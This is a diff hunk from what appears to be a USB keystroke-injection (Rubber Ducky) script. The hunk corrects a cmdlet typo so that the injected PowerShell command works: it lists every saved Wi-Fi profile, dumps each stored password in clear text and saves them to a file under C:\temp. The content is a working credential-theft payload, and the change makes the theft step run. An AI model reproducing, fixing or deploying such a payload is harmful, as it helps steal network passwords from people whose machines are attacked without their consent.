@@ -127,7 +127,7 @@ ENTER
 
 REM Retrieve passwords for each Wi-Fi profile and save to a text file
 STRING netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $profileName = 
-$_.ToString().Split(':')[1].Trim(); netsh wlan show profile name="$profileName" key=clear | SelectString 'Key Content' } > C:\temp\wifi_passwords.txt
+$_.ToString().Split(':')[1].Trim(); netsh wlan show profile name="$profileName" key=clear | Select-String 'Key Content' } > C:\temp\wifi_passwords.txt
 ENTER
 DELAY 1000
 
